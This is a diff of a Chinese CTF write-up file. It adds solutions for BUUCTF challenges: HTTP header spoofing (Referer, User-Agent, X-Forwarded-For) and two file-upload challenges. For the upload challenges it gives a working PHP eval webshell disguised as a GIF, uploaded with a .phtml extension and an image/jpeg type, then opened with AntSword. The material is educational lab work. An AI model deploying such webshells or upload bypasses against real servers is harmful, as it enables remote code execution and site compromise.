@@ -121,27 +121,53 @@ file?filename=/fllllllllllllag&filehash=66acf0dead35f8cb39b318705ccb0661
 
 ![BUUCTF Http1](images/BUUCTF.assets/BUUCTF%20Http1.png)
 
-进入后发现，页面要求必须从https://www.Sycsecret.com进入
+进入后发现，页面提示我们需要来自该网址：https://www.Sycsecret.com，直接改**header头**信息即可，我们可以通过使用**referer头**来修改
+
+我们bp改包后，发现页面又有一个提示，要求我们使用**Syclover**浏览器进入，**这里直接修改UA头即可**
+
+![BUUCTF[极客大挑战 2019]Http1](images/BUUCTF.assets/BUUCTF%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp1.png)
+
+页面继续提示，要求我们使用本地访问，这里就对XFF头进行伪造
+
+![BUUCTF[极客大挑战 2019]Http2](images/BUUCTF.assets/BUUCTF%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp2.png)
+
+ok，拿到flag
+
+![BUUCTF[极客大挑战 2019]Http3](images/BUUCTF.assets/BUUCTF%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp3.png)
 
 
 
 
 
+## [极客大挑战 2019]Upload
+
+进入就是文件上传，我们直接传就好了，这里我们文件后缀使用：**phtml**，修改文件类型：**image/jpeg**
+
+```
+GIF89a?
+<script language="php">eval($_REQUEST[x])</script>
+```
+
+访问：http://46f74b4e-872f-4b2e-af4a-c936d1ffb244.node3.buuoj.cn/upload/webshell.phtml
+
+蚁剑连上就好了
 
 
 
 
 
+## [ACTF2020 新生赛]Upload
 
+同样的文件上传，我们直接传就好了，这里我们文件后缀依然使用：**phtml**，修改文件类型：**image/jpeg**
 
+```
+GIF89a?
+<script language="php">eval($_REQUEST[x])</script>
+```
 
+访问：http://91d77da2-923b-4d93-83e3-5f6d5d5be7b1.node3.buuoj.cn/uplo4d/6bba837013452ad67f53ddce882b95ed.phtml
 
-
-
-
-
-
-
+蚁剑连上就好了
 
 
 
